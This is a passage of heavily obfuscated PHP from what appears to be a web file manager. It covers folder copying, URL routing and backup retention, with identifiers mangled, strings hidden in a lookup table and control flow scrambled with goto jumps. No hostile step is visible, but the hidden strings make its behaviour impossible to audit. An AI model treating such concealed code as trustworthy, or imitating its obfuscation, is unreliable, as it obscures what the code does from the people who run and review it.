dÁæó›œ›; c·Íæ¶À‰£: if (!$e™¼îšÅÆ) { return; } $e™¼îšÅÆ = array_to_keyvalue($e™¼îšÅÆ, $E–°¡¸¯†Û[33], $E–°¡¸¯†Û[410]); $C½éæ¢ã˜ = array($E–°¡¸¯†Û[410] => array($E–°¡¸¯†Û[7], $e™¼îšÅÆ)); goto BÕœ¼´Ì†; BÕœ¼´Ì†: Model($E–°¡¸¯†Û[409])->where($C½éæ¢ã˜)->save(array($E–°¡¸¯†Û[408] => 0)); Model($E–°¡¸¯†Û[411])->where($C½éæ¢ã˜)->delete(); goto E¿®˜åø³İ; E¿®˜åø³İ: } public function copyFolderFromIO($EËÏØŠ­ë´, $aÀ®†¤›ˆ£, $f½¼§‰îåº, $D¼‘™à½Ö, $E¶Ÿª”Èº) { goto f”‘ÇÀö´™; f”‘ÇÀö´™: $AÕÌˆ„ªßŒ =& $_SERVER[ÍÓÖ€°å]; $BïĞ‡ğùº = array($AÕÌˆ„ªßŒ[369] => array(), $AÕÌˆ„ªßŒ[370] => array(), $AÕÌˆ„ªßŒ[368] => array(), $AÕÌˆ„ªßŒ[412] => array()); $cƒÀÔò¼øÒ = $EËÏØŠ­ë´->getPathName($EËÏØŠ­ë´->pathThis($aÀ®†¤›ˆ£)); goto eÔİ–·¼Ú; cÁâ÷ë¹ŠÖ: Model($AÕÌˆ„ªßŒ[371])->addAll($BïĞ‡ğùº[$AÕÌˆ„ªßŒ[369]], array(), !0); Model($AÕÌˆ„ªßŒ[372])->eventCopy($eñ·í†”Ÿ»); $this->saveAll($BïĞ‡ğùº[$AÕÌˆ„ªßŒ[370]]); goto BŒ½ÚØ³; eÔİ–·¼Ú: $B¨ÄÎß¸ = $this->fileNameExist($f½¼§‰îåº, $cƒÀÔò¼øÒ); $eñ·í†”Ÿ» = $this->mkdir($f½¼§‰îåº, $cƒÀÔò¼øÒ, $D¼‘™à½Ö); if (!$B¨ÄÎß¸ || $D¼‘™à½Ö == REPEAT_RENAME_FOLDER) { $D¼‘™à½Ö = !1; } goto aá¬õáõÉÀ; DÖÏó•‘ˆ: $this->updateModifyTime($f½¼§‰îåº); return $eñ·í†”Ÿ»; goto C¾³½Œ¸ÀÇ; E¿Ùµ¯Îœ: Hook::trigger($AÕÌˆ„ªßŒ[414]); if ($eñ·í†”Ÿ») { $this->folderSizeResetChildren($eñ·í†”Ÿ»); } $this->_childrenListClear(); goto cÁâ÷ë¹ŠÖ; BŒ½ÚØ³: Model($AÕÌˆ„ªßŒ[402])->linkAdd($BïĞ‡ğùº[$AÕÌˆ„ªßŒ[368]]); Model($AÕÌˆ„ªßŒ[402])->remove($BïĞ‡ğùº[$AÕÌˆ„ªßŒ[412]]); $this->folderSizeReset($f½¼§‰îåº); goto DÖÏó•‘ˆ; aá¬õáõÉÀ: if ($B¨ÄÎß¸) { $this->_childrenAllMake($B¨ÄÎß¸); } Hook::trigger($AÕÌˆ„ªßŒ[413]); $this->_copyChildTo($EËÏØŠ­ë´, $aÀ®†¤›ˆ£, $eñ·í†”Ÿ», $D¼‘™à½Ö, $BïĞ‡ğùº, $E¶Ÿª”Èº); goto E¿Ùµ¯Îœ; C¾³½Œ¸ÀÇ: } private function _copyChildTo($eÀ¶±íìÂ, $c³Ñ»áâŒÕ, $dãÔ›±œ, $D«¦è™Ã…, &$F±÷‚›¡ÊÎ, $Díø†µâĞì) { goto cœßŠß„õ‡; cœßŠß„õ‡: $F‰İ’ğ«°† =& $_SERVER[ÍÓÖ€°å]; $b¯Àğë¼¯ = $this->sourceInfoCache($dãÔ›±œ); $FË¨ÁÎĞŠ = $eÀ¶±íìÂ->listPath($c³Ñ»áâŒÕ, !1, !0); goto Fë§š¾øÄ¢; Aª§Êíñïå: $FĞî¶í¼Üø = $this->_childrenList($dãÔ›±œ); $FĞî¶í¼Üø = array_to_keyvalue($FĞî¶í¼Üø, $F‰İ’ğ«°†[28]); foreach ($fÁìê®œ¬è as $A‡…í–ÅÄ„) { $bÒ—†Úî· = $FĞî¶í¼Üø[$A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]]]; $a±»ĞÒ·ë = $bÒ—†Úî·[$F‰İ’ğ«°†[365]]; $this->_copyApplyMeta($bÒ—†Úî·, $F±÷‚›¡ÊÎ); if ($A‡…í–ÅÄ„[$F‰İ’ğ«°†[29]] == $F‰İ’ğ«°†[77]) { $A‡…í–ÅÄ„[$F‰İ’ğ«°†[76]] = $eÀ¶±íìÂ->getPathInner($A‡…í–ÅÄ„[$F‰İ’ğ«°†[76]]); $this->_copyChildTo($eÀ¶±íìÂ, $A‡…í–ÅÄ„[$F‰İ’ğ«°†[76]], $a±»ĞÒ·ë, $D«¦è™Ã…, $F±÷‚›¡ÊÎ, $Díø†µâĞì); } } goto fÑ¦ÅÀ™¦; Fë§š¾øÄ¢: $fÁìê®œ¬è = array_merge($FË¨ÁÎĞŠ[$F‰İ’ğ«°†[74]], $FË¨ÁÎĞŠ[$F‰İ’ğ«°†[75]]); $f¶¹Ù­Ôƒ = $this->_addFiles($eÀ¶±íìÂ, $FË¨ÁÎĞŠ[$F‰İ’ğ«°†[74]], $Díø†µâĞì); $cÉçˆƒ÷˜ = array(); goto bº”½´ËÛ…; bº”½´ËÛ…: foreach ($fÁìê®œ¬è as &$A‡…í–ÅÄ„) { goto fœé¢ë‰ôš; f«Ş“„·: $A‡…í–ÅÄ„[$F‰İ’ğ«°†[78]] = _get($A‡…í–ÅÄ„, $F‰İ’ğ«°†[78], 0); $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]] = _get($A‡…í–ÅÄ„, $F‰İ’ğ«°†[373], 0); if (!isset($A‡…í–ÅÄ„[$F‰İ’ğ«°†[415]]) && $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]]) { $F±÷‚›¡ÊÎ[$F‰İ’ğ«°†[412]][] = $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]]; } goto FÒáµ‡È²‚; FÒáµ‡È²‚: if ($D«¦è™Ã…) { $d¢Â¡õ©÷­ = $this->fileNameExistCache($dãÔ›±œ, $A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]]); if ($d¢Â¡õ©÷­) { if ($A‡…í–ÅÄ„[$F‰İ’ğ«°†[366]] || $D«¦è™Ã… == REPEAT_SKIP) { continue; } if ($D«¦è™Ã… == REPEAT_REPLACE) { $bÒ—†Úî· = $this->sourceInfoCache($d¢Â¡õ©÷­); $aœÈ”§›¶² = $this->fileHistory($bÒ—†Úî·, $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]], $A‡…í–ÅÄ„[$F‰İ’ğ«°†[78]]); if ($aœÈ”§›¶²) { $F±÷‚›¡ÊÎ[$F‰İ’ğ«°†[368]][] = $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]]; } continue; } else { if ($D«¦è™Ã… == REPEAT_RENAME) { $A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]] = $this->fileNameAutoCache($dãÔ›±œ, $A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]], $D«¦è™Ã…, !1); } } } } if (!$A‡…í–ÅÄ„[$F‰İ’ğ«°†[366]] && $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]]) { $F±÷‚›¡ÊÎ[$F‰İ’ğ«°†[368]][] = $A‡…í–ÅÄ„[$F‰İ’ğ«°†[373]]; } $cÉçˆƒ÷˜[] = $this->_makeItemData($A‡…í–ÅÄ„, $b¯Àğë¼¯, $A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]]); goto bõòËí±Ç; fœé¢ë‰ôš: if (isset($f¶¹Ù­Ôƒ[$A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]]])) { $A‡…í–ÅÄ„ = $f¶¹Ù­Ôƒ[$A‡…í–ÅÄ„[$F‰İ’ğ«°†[28]]]; } $A‡…í–ÅÄ„[$F‰İ’ğ«°†[366]] = $A‡…í–ÅÄ„[$F‰İ’ğ«°†[29]] == $F‰İ’ğ«°†[77]; $A‡…í–ÅÄ„[$F‰İ’ğ«°†[380]] = _get($A‡…í–ÅÄ„, $F‰İ’ğ«°†[148], $F‰İ’ğ«°†[33]); goto f«Ş“„·; bõòËí±Ç: } unset($A‡…í–ÅÄ„); if (!empty($cÉçˆƒ÷˜)) { $this->addAll($cÉçˆƒ÷˜); } goto Aª§Êíñïå; fÑ¦ÅÀ™¦: } private function _addFiles($EÛ–«“ƒÕ´, $aœºŠø‹Ó§, $AáìÏõ¸İê) { goto bï…§Æ™Ùó; cáÅà¬À©´: $cˆ×äã‡†Ÿ = $F±ØÀÄ›ùÁ->where($b¨Êç±ğÎ¿)->select(); $cˆ×äã‡†Ÿ = $cˆ×äã‡†Ÿ ? $cˆ×äã‡†Ÿ : array(); foreach ($cˆ×äã‡†Ÿ as $D±ÔÏ­•Ì’) { if (!isset($bòøÂ‚™Ô¸[$D±ÔÏ­•Ì’[$b‰˜ì¹Ë´[151]]])) { continue; } $f„ÉĞÎˆ‡ = $bòøÂ‚™Ô¸[$D±ÔÏ­•Ì’[$b‰˜ì¹Ë´[151]]]; foreach ($f„ÉĞÎˆ‡ as &$b°‡ŸÇ÷··) { $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[373]] = $D±ÔÏ­•Ì’[$b‰˜ì¹Ë´[373]]; $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[415]] = !0; } unset($b°‡ŸÇ÷··); } goto eö‡Ç¯ª¦; eö‡Ç¯ª¦: $fóîùâçÂÚ = array(); foreach ($aœºŠø‹Ó§ as $DÄÒÁ¬“õ) { if (isset($DÄÒÁ¬“õ[$b‰˜ì¹Ë´[415]]) && $DÄÒÁ¬“õ[$b‰˜ì¹Ë´[415]]) { continue; } $e×©¨Â­ = $EÛ–«“ƒÕ´->getPathInner($DÄÒÁ¬“õ[$b‰˜ì¹Ë´[76]]); $DÖÊğ³ñÒˆ = $F±ØÀÄ›ùÁ->addFileMake($e×©¨Â­, $DÄÒÁ¬“õ[$b‰˜ì¹Ë´[78]], $DÄÒÁ¬“õ[$b‰˜ì¹Ë´[152]], $DÄÒÁ¬“õ[$b‰˜ì¹Ë´[151]], $DÄÒÁ¬“õ[$b‰˜ì¹Ë´[28]], $AáìÏõ¸İê); $fóîùâçÂÚ[] = $DÖÊğ³ñÒˆ; } $F±ØÀÄ›ùÁ->addAll($fóîùâçÂÚ); goto E¹«ô‘¡çŞ; bï…§Æ™Ùó: $b‰˜ì¹Ë´ =& $_SERVER[ÍÓÖ€°å]; if (!$aœºŠø‹Ó§ || count($aœºŠø‹Ó§) == 0) { return array(); } $bòøÂ‚™Ô¸ = array(); goto Eî¨©Â´íË; fê·ƒÖ÷Åç: return $CãÜƒâ·‚‡; goto d ­À±¸‹; Eî¨©Â´íË: foreach ($aœºŠø‹Ó§ as &$b°‡ŸÇ÷··) { goto c“çŠˆí¤Ù; bäÔÔÏÕÁ: $aåÛ²â†ˆ = $EÛ–«“ƒÕ´->hashMd5($b°‡ŸÇ÷··[$b‰˜ì¹Ë´[76]]); if (strlen($aåÛ²â†ˆ) > 10 && !isset($bòøÂ‚™Ô¸[$aåÛ²â†ˆ])) { $bòøÂ‚™Ô¸[$aåÛ²â†ˆ] = array(); } $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[152]] = $Cğ¾ìò„; goto A„ÅÂâÍŒÆ; A„ÅÂâÍŒÆ: $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[151]] = $aåÛ²â†ˆ; Hook::trigger($b‰˜ì¹Ë´[417], $b°‡ŸÇ÷··); $bòøÂ‚™Ô¸[$aåÛ²â†ˆ][] =& $b°‡ŸÇ÷··; goto A¬¼êõ§½; c“çŠˆí¤Ù: Hook::trigger($b‰˜ì¹Ë´[416], $b°‡ŸÇ÷··); $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[76]] = $EÛ–«“ƒÕ´->getPathInner($b°‡ŸÇ÷··[$b‰˜ì¹Ë´[76]]); $Cğ¾ìò„ = $EÛ–«“ƒÕ´->hashSimple($b°‡ŸÇ÷··[$b‰˜ì¹Ë´[76]]); goto bäÔÔÏÕÁ; A¬¼êõ§½: if (count($bòøÂ‚™Ô¸[$aåÛ²â†ˆ]) > 1) { $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[415]] = !0; } goto aĞÖÙ÷”–‚; aĞÖÙ÷”–‚: } $b¨Êç±ğÎ¿ = array($b‰˜ì¹Ë´[151] => array($b‰˜ì¹Ë´[7], array_keys($bòøÂ‚™Ô¸))); $F±ØÀÄ›ùÁ = Model($b‰˜ì¹Ë´[418]); goto cáÅà¬À©´; Aà›ÛöÔ“ä: foreach ($cˆ×äã‡†Ÿ as $D±ÔÏ­•Ì’) { if (!isset($bòøÂ‚™Ô¸[$D±ÔÏ­•Ì’[$b‰˜ì¹Ë´[151]]])) { continue; } $D‡†ôô‰´¨ =& $bòøÂ‚™Ô¸[$D±ÔÏ­•Ì’[$b‰˜ì¹Ë´[151]]]; foreach ($D‡†ôô‰´¨ as &$b°‡ŸÇ÷··) { $b°‡ŸÇ÷··[$b‰˜ì¹Ë´[373]] = $D±ÔÏ­•Ì’[$b‰˜ì¹Ë´[373]]; } unset($b°‡ŸÇ÷··); } $CãÜƒâ·‚‡ = array(); foreach ($aœºŠø‹Ó§ as $d‡¸¬ÕËÑ÷) { $CãÜƒâ·‚‡[$d‡¸¬ÕËÑ÷[$b‰˜ì¹Ë´[28]]] = $d‡¸¬ÕËÑ÷; } goto fê·ƒÖ÷Åç; E¹«ô‘¡çŞ: $b¨Êç±ğÎ¿ = array($b‰˜ì¹Ë´[151] => array($b‰˜ì¹Ë´[7], array_keys($bòøÂ‚™Ô¸))); $cˆ×äã‡†Ÿ = $F±ØÀÄ›ùÁ->where($b¨Êç±ğÎ¿)->select(); $cˆ×äã‡†Ÿ = $cˆ×äã‡†Ÿ ? $cˆ×äã‡†Ÿ : array(); goto Aà›ÛöÔ“ä; d ­À±¸‹: } } class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\x69\156\144\145\x78"; public function setDefault($e‘ í¦øí§) { $bˆààÁÏÜ =& $_SERVER[ÍÓÖ€°å]; $fÙŒğê¾¶˜ = explode($bˆààÁÏÜ[90], trim($e‘ í¦øí§, $bˆààÁÏÜ[90])); $this->defaultModule = $fÙŒğê¾¶˜[0] ? $fÙŒğê¾¶˜[0] : $this->defaultModule; $this->defaultController = $fÙŒğê¾¶˜[1] ? $fÙŒğê¾¶˜[1] : $this->defaultController; $this->defaultAction = $fÙŒğê¾¶˜[2] ? $fÙŒğê¾¶˜[2] : $this->defaultAction; } public function appRun($c¶´ÊÏìôŞ) { goto b‡°íÉÛ¨ñ; b‡°íÉÛ¨ñ: $F‰ÊÄğ»ù =& $_SERVER[ÍÓÖ€°å]; $dãšöŒê¬Š = explode($F‰ÊÄğ»ù[90], $c¶´ÊÏìôŞ); $E­®„ ›ùÀ = strtolower($dãšöŒê¬Š[0]); goto BïŒ‡Ñƒ¤Ó; cÖºİÊÈ®®: ActionCall($c¶´ÊÏìôŞ); Hook::trigger($A»´àÇ‹¸ . $F‰ÊÄğ»ù[424], $c¶´ÊÏìôŞ); goto e÷¾”àÎ˜à; BïŒ‡Ñƒ¤Ó: $A»´àÇ‹¸ = $F‰ÊÄğ»ù[419]; if ($E­®„ ›ùÀ == $F‰ÊÄğ»ù[420]) { $A»´àÇ‹¸ = $F‰ÊÄğ»ù[421]; $dãšöŒê¬Š[0] = $F‰ÊÄğ»ù[33]; $dãšöŒê¬Š[1] = $dãšöŒê¬Š[1] . $F‰ÊÄğ»ù[422]; $c¶´ÊÏìôŞ = join($F‰ÊÄğ»ù[90], $dãšöŒê¬Š); $c¶´ÊÏìôŞ = trim($c¶´ÊÏìôŞ, $F‰ÊÄğ»ù[90]); } Hook::trigger($A»´àÇ‹¸ . $F‰ÊÄğ»ù[423], $c¶´ÊÏìôŞ); goto cÖºİÊÈ®®; e÷¾”àÎ˜à: } private function autorun() { $BÛĞ²ô =& $_SERVER[ÍÓÖ€°å]; global $config; if (count($config[$BÛĞ²ô[425]]) == 0) { return; } foreach ($config[$BÛĞ²ô[425]] as $EŒÂù†„øŞ => $c°öØÄŞ÷) { $this->appRun($c°öØÄŞ÷); } } private function parsePluginRoute() { goto eµ‘æ‚„ô‘; eµ‘æ‚„ô‘: $c¹ˆ¦ƒĞĞ =& $_SERVER[ÍÓÖ€°å]; $B‡Ä…Ëºì¨ = $c¹ˆ¦ƒĞĞ[420]; $A¡Üä»—¤Ï = $GLOBALS[$c¹ˆ¦ƒĞĞ[7]][$c¹ˆ¦ƒĞĞ[426]][0]; goto eİÑóó°; aÈ­ŸµĞ©: $Aò³¾Œà = array($c¹ˆ¦ƒĞĞ[420], $Aå ¾Øä¢ù); $aœ†ƒ×™ÂÙ = array_slice($GLOBALS[$c¹ˆ¦ƒĞĞ[7]][$c¹ˆ¦ƒĞĞ[426]], 1); $GLOBALS[$c¹ˆ¦ƒĞĞ[7]][$c¹ˆ¦ƒĞĞ[426]] = array_merge($Aò³¾Œà, $aœ†ƒ×™ÂÙ); goto e¡Ïó –éº; e¡Ïó –éº: $GLOBALS[$c¹ˆ¦ƒĞĞ[7]][$c¹ˆ¦ƒĞĞ[427]] = implode($c¹ˆ¦ƒĞĞ[90], $GLOBALS[$c¹ˆ¦ƒĞĞ[7]][$c¹ˆ¦ƒĞĞ[426]]); goto EêÂÔêÌÀÔ; eİÑóó°: if (!$A¡Üä»—¤Ï || strlen($A¡Üä»—¤Ï) <= strlen($B‡Ä…Ëºì¨)) { return; } if (strtolower(substr($A¡Üä»—¤Ï, -strlen($B‡Ä…Ëºì¨))) != $B‡Ä…Ëºì¨) { return; } $Aå ¾Øä¢ù = substr($A¡Üä»—¤Ï, 0, -strlen($B‡Ä…Ëºì¨)); goto aÈ­ŸµĞ©; EêÂÔêÌÀÔ: } private function parseUriRoute() { goto cèÒ¥¬¤¨; f§˜ÎøÄ‘œ: $D¹ãœäÊ½ = $aÈÀ•—ëÆ³[429]; if (!strstr($e›è­å—º, $D¹ãœäÊ½)) { return; } $A»æë£“êº = strrpos($e›è­å—º, $D¹ãœäÊ½); goto eã…’Á‚·; cèÒ¥¬¤¨: $aÈÀ•—ëÆ³ =& $_SERVER[ÍÓÖ€°å]; if ($GLOBALS[$aÈÀ•—ëÆ³[7]][$aÈÀ•—ëÆ³[427]] != $aÈÀ•—ëÆ³[33]) { return; } $e›è­å—º = $_SERVER[$aÈÀ•—ëÆ³[428]]; goto f§˜ÎøÄ‘œ; f¬×ØĞøš: $GLOBALS[$aÈÀ•—ëÆ³[7]][$aÈÀ•—ëÆ³[426]] = explode($aÈÀ•—ëÆ³[8], $A¸¬ñ‚ì); $GLOBALS[$aÈÀ•—ëÆ³[7]][$aÈÀ•—ëÆ³[427]] = implode($aÈÀ•—ëÆ³[90], $GLOBALS[$aÈÀ•—ëÆ³[7]][$aÈÀ•—ëÆ³[426]]); goto C°õòÉ†…; eã…’Á‚·: $A¸¬ñ‚ì = substr($e›è­å—º, $A»æë£“êº + strlen($D¹ãœäÊ½)); preg_match_all($aÈÀ•—ëÆ³[430], $A¸¬ñ‚ì, $aç»ö®Şå…); $A¸¬ñ‚ì = trim($aç»ö®Şå…[0][0], $aÈÀ•—ëÆ³[8]); goto f¬×ØĞøš; C°õòÉ†…: } public function run() { goto Có¾Œ„„›; dÂÇ– ‰ĞÃ: define($a­¢ëˆ³…[432], $AóƒÆíØ„æ[1] ? $AóƒÆíØ„æ[1] : $this->defaultController); define($a­¢ëˆ³…[433], $AóƒÆíØ„æ[2] ? $AóƒÆíØ„æ[2] : $this->defaultAction); define($a­¢ëˆ³…[434], MOD . $a­¢ëˆ³…[90] . ST . $a­¢ëˆ³…[90] . ACT); goto EğŒÄšŒé; Có¾Œ„„›: $a­¢ëˆ³… =& $_SERVER[ÍÓÖ€°å]; $this->parseUriRoute(); $this->parsePluginRoute(); goto fô²¼ªï¨˜; EğŒÄšŒé: $this->autorun(); if (count($AóƒÆíØ„æ) >= 3) { $this->appRun($eì»³Õ¦¢); } else { $this->appRun(ACTION); } goto AÖ¬†­Â‹Ú; fô²¼ªï¨˜: $AóƒÆíØ„æ = $GLOBALS[$a­¢ëˆ³…[7]][$a­¢ëˆ³…[426]]; $eì»³Õ¦¢ = $GLOBALS[$a­¢ëˆ³…[7]][$a­¢ëˆ³…[427]]; define($a­¢ëˆ³…[431], $AóƒÆíØ„æ[0] ? $AóƒÆíØ„æ[0] : $this->defaultModule); goto dÂÇ– ‰ĞÃ; AÖ¬†­Â‹Ú: } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $EĞÜ½å¤§È =& $_SERVER[ÍÓÖ€°å]; self::$name = date($EĞÜ½å¤§È[435]); if (!($e­ÈË²³Êª = Model($EĞÜ½å¤§È[436])->lastItem())) { $e­ÈË²³Êª = $this->initData(); } else { self::$name = $e­ÈË²³Êª[$EĞÜ½å¤§È[28]]; if ($e­ÈË²³Êª[$EĞÜ½å¤§È[437]] == $EĞÜ½å¤§È[367]) { self::$name = date($EĞÜ½å¤§È[438]); $BÈìÊŸÏò = 0; if (isset($e­ÈË²³Êª[$EĞÜ½å¤§È[273]][$EĞÜ½å¤§È[155]][$EĞÜ½å¤§È[373]])) { $BÈìÊŸÏò = (int) $e­ÈË²³Êª[$EĞÜ½å¤§È[273]][$EĞÜ½å¤§È[155]][$EĞÜ½å¤§È[373]]; } if ($e­ÈË²³Êª[$EĞÜ½å¤§È[28]] == self::$name) { Model($EĞÜ½å¤§È[436])->remove($e­ÈË²³Êª[$EĞÜ½å¤§È[357]]); } $e­ÈË²³Êª = $this->initData($BÈìÊŸÏò, $e­ÈË²³Êª[$EĞÜ½å¤§È[439]]); } else { $this->checkStore($e­ÈË²³Êª[$EĞÜ½å¤§È[439]]); } } self::$option = $e­ÈË²³Êª; } private function initData($eàç¨’÷Ÿ = 0, $d»‹Ó»ï­„ = '') { goto cÛÄˆ„ó‡±; cÛÄˆ„ó‡±: $FÁ¢¬Ô–Û¸ =& $_SERVER[ÍÓÖ€°å]; $B•¾×÷“çÏ = Model($FÁ¢¬Ô–Û¸[436])->config(); if ($d»‹Ó»ï­„ && $B•¾×÷“çÏ[$FÁ¢¬Ô–Û¸[439]] != $d»‹Ó»ï­„) { $eàç¨’÷Ÿ = 0; } goto A¹ë‡¿©¤†; C”åçÒ„Ï: $fïŒÆÚÌ·[$FÁ¢¬Ô–Û¸[357]] = $Dˆ¥—ÃÌ›; return $fïŒÆÚÌ·; goto BÄÍ´ŠàÃ; A¹ë‡¿©¤†: $this->checkStore($B•¾×÷“çÏ[$FÁ¢¬Ô–Û¸[439]]); $fïŒÆÚÌ· = array($FÁ¢¬Ô–Û¸[439] => $B•¾×÷“çÏ[$FÁ¢¬Ô–Û¸[439]], $FÁ¢¬Ô–Û¸[28] => self::$name, $FÁ¢¬Ô–Û¸[437] => 0, $FÁ¢¬Ô–Û¸[440] => $B•¾×÷“çÏ[$FÁ¢¬Ô–Û¸[440]], $FÁ¢¬Ô–Û¸[273] => array($FÁ¢¬Ô–Û¸[441] => array($FÁ¢¬Ô–Û¸[437] => 0), $FÁ¢¬Ô–Û¸[442] => array($FÁ¢¬Ô–Û¸[437] => 0, $FÁ¢¬Ô–Û¸[443] => 0, $FÁ¢¬Ô–Û¸[444] => 0, $FÁ¢¬Ô–Û¸[29] => $FÁ¢¬Ô–Û¸[33]), $FÁ¢¬Ô–Û¸[445] => array($FÁ¢¬Ô–Û¸[437] => 0, $FÁ¢¬Ô–Û¸[443] => 0, $FÁ¢¬Ô–Û¸[444] => 0), $FÁ¢¬Ô–Û¸[155] => array($FÁ¢¬Ô–Û¸[437] => 0, $FÁ¢¬Ô–Û¸[446] => 0, $FÁ¢¬Ô–Û¸[447] => 0, $FÁ¢¬Ô–Û¸[448] => 0, $FÁ¢¬Ô–Û¸[449] => 0, $FÁ¢¬Ô–Û¸[373] => $eàç¨’÷Ÿ)), $FÁ¢¬Ô–Û¸[450] => time(), $FÁ¢¬Ô–Û¸[451] => 0); $Dˆ¥—ÃÌ› = Model($FÁ¢¬Ô–Û¸[436])->insert($fïŒÆÚÌ·); goto C”åçÒ„Ï; BÄÍ´ŠàÃ: } private function checkStore($dÔİ§ÔÎ²ï) { $B‹‘¼È‡ó =& $_SERVER[ÍÓÖ€°å]; $e¨ˆåíğª = Model($B‹‘¼È‡ó[452])->listData($dÔİ§ÔÎ²ï); Model($B‹‘¼È‡ó[452])->checkConfig($e¨ˆåíğª); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÍÓÖ€°å][436])->findByName(self::$name); } return self::$option; } public static function set($a‡×‘Ü¶ÈÁ) { $fîŠÕŒ¤î =& $_SERVER[ÍÓÖ€°å]; $bÉ£‡±ªµ = self::get(); foreach ($a‡×‘Ü¶ÈÁ as $Bó”—Ÿšé  => $F©†îÛµ×ø) { $aŸˆ¦‹”§ = explode($fîŠÕŒ¤î[90], $Bó”—Ÿšé ); $CâãÅÑ‹ôó = count($aŸˆ¦‹”§); switch ($CâãÅÑ‹ôó) { case 1: $bÉ£‡±ªµ[$aŸˆ¦‹”§[0]] = $F©†îÛµ×ø; break; case 2: $bÉ£‡±ªµ[$aŸˆ¦‹”§[0]][$aŸˆ¦‹”§[1]] = $F©†îÛµ×ø; break; case 3: $bÉ£‡±ªµ[$aŸˆ¦‹”§[0]][$aŸˆ¦‹”§[1]][$aŸˆ¦‹”§[2]] = $F©†îÛµ×ø; break; } } Model($fîŠÕŒ¤î[436])->update($bÉ£‡±ªµ[$fîŠÕŒ¤î[357]], $bÉ£‡±ªµ); self::$option = $bÉ£‡±ªµ; return self::$option; } public function keep() { $aáøĞ‰Úôõ =& $_SERVER[ÍÓÖ€°å]; $BŒª¼±–íö = self::get(); if ($BŒª¼±–íö[$aáøĞ‰Úôõ[273]][$aáøĞ‰Úôõ[441]][$aáøĞ‰Úôõ[437]] == $aáøĞ‰Úôõ[367]) { return; } $this->backupKeep($BŒª¼±–íö); self::set(array($aáøĞ‰Úôõ[453] => 1)); } private function backupKeep($FÇØˆ…—ÊŒ) { goto b»Ğö²µÎ; b»Ğö²µÎ: $DË³‰£ÆÒö =& $_SERVER[ÍÓÖ€°å]; $eÁóëí‘¤£ = Model($DË³‰£ÆÒö[436])->listData(); if (empty($eÁóëí‘¤£)) { return; } goto A«•¬°ÙÃ; A«•¬°ÙÃ: $EøÅ›ÉâÍˆ = array(); for ($D§Æ‹‚Å‘Š = 0; $D§Æ‹‚Å‘Š <= 7; $D§Æ‹‚Å‘Š++) { $EøÅ›ÉâÍˆ[] = date($DË³‰£ÆÒö[438], strtotime("\x2d{$D§Æ‹‚Å‘Š}\40\x64\141\171\163")); } for ($D§Æ‹‚Å‘Š = 0; $D§Æ‹‚Å‘Š < 12; $D§Æ‹‚Å‘Š++) { $EøÅ›ÉâÍˆ[] = date($DË³‰£ÆÒö[454], strtotime("\55{$D§Æ‹‚Å‘Š}\x20\x6d\x6f\x6e\x74\x68\x73")); } goto fÈß…ñòà­; fÈß…ñòà­: $EøÅ›ÉâÍˆ = array_unique($EøÅ›ÉâÍˆ); foreach ($eÁóëí‘¤£ as $a–ø†Ïö) { if (!empty($a–ø†Ïö[$DË³‰£ÆÒö[28]]) && in_array($a–ø†Ïö[$DË³‰£ÆÒö[28]], $EøÅ›ÉâÍˆ)) { continue; } Model($DË³‰£ÆÒö[436])->remove($a–ø†Ïö[$DË³‰£ÆÒö[357]]); $DÔŸ ˜ì©Ì = "\x7b\151\x6f\x3a{$FÇØˆ…—ÊŒ[$DË³‰£ÆÒö[439]]}\175\x2f\x64\x61\x74\141\x62\x61\163\x65\x2f\142\141\x63\x6b\165\x70\137{$a–ø†Ïö[$DË³‰£ÆÒö[28]]}"; IO::remove($DÔŸ ˜ì©Ì, !1); } goto Bù¡“ßˆÌâ; Bù¡“ßˆÌâ: } public function db() { goto DŠ‘¯ßÑÛ; BÖË°Ø‹«à: return !0; goto f‹ù¯×ì•Ó; c·­ö¥ÀÉî: $eå»©•ç‚œ = new BackupDb(); if (!$eå»©•ç‚œ->index()) { return !1; } self::set(array($b¤§—‚¢ôÌ[455] => 1)); goto BÖË°Ø‹«à; DŠ‘¯ßÑÛ: $b¤§—‚¢ôÌ =& $_SERVER[ÍÓÖ€°å]; $F¢ºåä–ß = self::get(); if ($F¢ºåä–ß[$b¤§—‚¢ôÌ[273]][$b¤§—‚¢ôÌ[442]][$b¤§—‚¢ôÌ[437]] == $b¤§—‚¢ôÌ[367]) { return !0; } goto c·­ö¥ÀÉî; f‹ù¯×ì•Ó: } public function dbFile() { goto f’âÈÈ–™; eßöøÒœ¿š: return !0; goto d£Ğ±èá†; Cš«Ó½Ÿ›©: $e¾©÷ğ›öÕ = new BackupDbFile(); if (!$e¾©÷ğ›öÕ->index()) { return !1; } self::set(array($Fè–ßƒ‡Ã¯[456] => 1)); goto eßöøÒœ¿š; f’âÈÈ–™: $Fè–ßƒ‡Ã¯ =& $_SERVER[ÍÓÖ€°å]; $eÑßƒ÷æêÜ = self::get(); if ($eÑßƒ÷æêÜ[$Fè–ßƒ‡Ã¯[273]][$Fè–ßƒ‡Ã¯[445]][$Fè–ßƒ‡Ã¯[437]] == $Fè–ßƒ‡Ã¯[367]) { return !0; } goto Cš«Ó½Ÿ›©; d£Ğ±èá†: } public function file() { $F§¦°›ê°¸ =& $_SERVER[ÍÓÖ€°å]; $cÎœ³¡´‘Ú = self::get(); if ($cÎœ³¡´‘Ú[$F§¦°›ê°¸[273]][$F§¦°›ê°¸[155]][$F§¦°›ê°¸[437]] == $F§¦°›ê°¸[367]) { return !0; } if 